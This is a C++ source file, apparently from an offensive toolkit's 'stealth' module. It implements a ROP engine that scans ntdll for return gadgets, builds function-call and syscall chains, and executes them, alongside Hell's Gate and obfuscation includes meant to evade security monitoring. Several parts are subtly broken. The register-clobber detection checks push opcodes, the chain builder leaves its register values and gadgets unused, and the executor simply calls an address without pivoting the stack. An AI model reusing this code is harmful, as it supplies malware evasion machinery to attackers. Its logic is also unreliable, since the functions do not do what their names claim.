#include <diarna/compiler_port.hpp>
#include <diarna/stealth/rop_engine.hpp>
#include <diarna/stealth/hells_gate.hpp>

#include <psapi.h>
#include <algorithm>
#include <cstring>
#include <chrono>

#include <obfuscation/obfusheader.h>
namespace diarna::stealth {

ROPEngine& ROPEngine::instance() { static ROPEngine e; return e; }

bool ROPEngine::initialize(HMODULE base_module) {
    INDIRECT_BRANCH;
    if (!base_module) base_module = GetModuleHandleW(L"ntdll.dll");
    if (!base_module) return false;

    scan_module(base_module, "");
    chain_stack_region_ = VirtualAlloc(nullptr, 65536,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    chain_stack_size_ = 65536;
    return chain_stack_region_ != nullptr;
}

std::vector<ROPGadget> ROPEngine::find_gadgets(HMODULE module,
                                                 const std::string& constraints) {
    for (auto& cache : gadget_cache_)
        if (cache.module == module) return cache.gadgets;
    return scan_module(module, constraints);
}

std::vector<ROPGadget> ROPEngine::scan_module(HMODULE module,
                                                const std::string& constraints) {
    std::vector<ROPGadget> results;
    MODULEINFO mi;
    if (!GetModuleInformation(GetCurrentProcess(), module, &mi, sizeof(mi)))
        return results;

    uint8_t* base = (uint8_t*)mi.lpBaseOfDll;
    size_t size = mi.SizeOfImage;

    static const uint8_t RET_BYTES[] = {0xC3, 0xC2, 0xCB, 0xCA};
    static const uint8_t RET_IMM[] = {0xC2, 0xCA};

    for (size_t i = 0; i < size - 1; ++i) {
        bool is_ret = false;
        uint8_t ret_byte = 0;
        for (auto rb : RET_BYTES) {
            if (base[i] == rb) { is_ret = true; ret_byte = rb; break; }
        }
        if (!is_ret) continue;

        for (int lookback = 1; lookback <= 16 && (int)i - lookback >= 0; ++lookback) {
            size_t start = i - lookback;

            if (base[start] == 0xCC || base[start] == 0xC3 || base[start] == 0xE9)
                continue;

            ROPGadget g;
            g.address = base + start;
            g.vaddr = (uint64_t)(base + start) - (uint64_t)mi.lpBaseOfDll;
            g.bytes.assign(base + start, base + i + 1);

            if (g.bytes.size() > 32) continue;

            g.stack_shift = 8;
            if (std::find(std::begin(RET_IMM), std::end(RET_IMM), ret_byte) !=
                std::end(RET_IMM) && i + 2 < size)
                g.stack_shift = 8 + *(uint16_t*)(base + i + 1);

            g.is_ret_gadget = true;
            g.clobbers_rax = false; g.clobbers_rcx = false; g.clobbers_rdx = false;
            g.preserves_rsp = false;

            for (auto b : g.bytes) {
                if (b >= 0x50 && b <= 0x57 && (b & 7) == 0) g.clobbers_rax = true;
                if (b >= 0x50 && b <= 0x57 && (b & 7) == 1) g.clobbers_rcx = true;
                if (b >= 0x50 && b <= 0x57 && (b & 7) == 2) g.clobbers_rdx = true;
            }

            g.hash = hash_gadget_bytes(g.bytes);

            if (constraints.empty() || g.bytes.size() >= 2) {
                results.push_back(g);
                stats_.total_gadgets++;
                if (g.is_ret_gadget) stats_.ret_terminated++;
            }

            break;
        }
    }

    GadgetCache cache;
    cache.module = module;
    cache.gadgets = results;
    cache.scanned_at = std::chrono::steady_clock::now();
    gadget_cache_.push_back(cache);

    return results;
}

ROPChain ROPEngine::build_function_call(void* func_addr,
                                          const std::vector<uint64_t>& args) {
    ROPChain chain;

    int reg_args = (int)std::min(args.size(), (size_t)4);
    uint64_t reg_vals[4] = {};

    for (int i = 0; i < reg_args; ++i) reg_vals[i] = args[i];

    for (size_t i = reg_args; i < args.size(); ++i) {
        ROPGadget push_gadget;
        push_gadget.stack_shift = 8;
        push_gadget.is_ret_gadget = true;
        chain.gadgets.push_back(push_gadget);
        chain.stack_values.push_back(args[i]);
    }

    chain.stack_values.push_back((uint64_t)func_addr);
    chain.is_executable = true;

    return chain;
}

ROPChain ROPEngine::build_syscall_chain(uint16_t ssn,
                                          const std::vector<uint64_t>& args) {
    ROPChain chain;

    chain.stack_values.push_back(ssn);

    for (size_t i = 0; i < std::min(args.size(), (size_t)4); ++i)
        chain.stack_values.push_back(args[i]);

    chain.is_executable = true;
    return chain;
}

bool ROPEngine::execute_chain(const ROPChain& chain) {
    if (!chain_stack_region_ || !chain.is_executable) return false;
    INDIRECT_BRANCH;

    DWORD old;
    VirtualProtect(chain_stack_region_, chain_stack_size_,
        PAGE_READWRITE, &old);

    uint64_t* stack = (uint64_t*)chain_stack_region_;
    size_t idx = 0;

    for (auto val : chain.stack_values)
        stack[chain_stack_size_/8 - 1 - (idx++)] = val;

    VirtualProtect(chain_stack_region_, chain_stack_size_, old, &old);

#ifdef DIARNA_MSVC
    __try {
        void* fn = (void*)chain.stack_values.back();
        ((void(*)())fn)();
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
#else
    void* fn = (void*)chain.stack_values.back();
    ((void(*)())fn)();
#endif
    return true;
}

void* ROPEngine::allocate_chain_stack(const ROPChain& chain) {
    void* stack = VirtualAlloc(nullptr, chain.stack_values.size() * 8 + 4096,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stack) return nullptr;

    uint64_t* sp = (uint64_t*)((uint8_t*)stack + chain.stack_values.size() * 8);
    for (size_t i = 0; i < chain.stack_values.size(); ++i)
        sp[-(int64_t)(i+1)] = chain.stack_values[i];

    return sp;
}

uint32_t ROPEngine::hash_gadget_bytes(std::span<const uint8_t> bytes) {
    uint32_t h = 0x811C9DC5;
    for (uint8_t b : bytes) { h ^= b; h *= 0x01000193; }
    return h;
}

ROPEngine::GadgetStats ROPEngine::stats() const { return stats_; }

} // namespace diarna::stealth
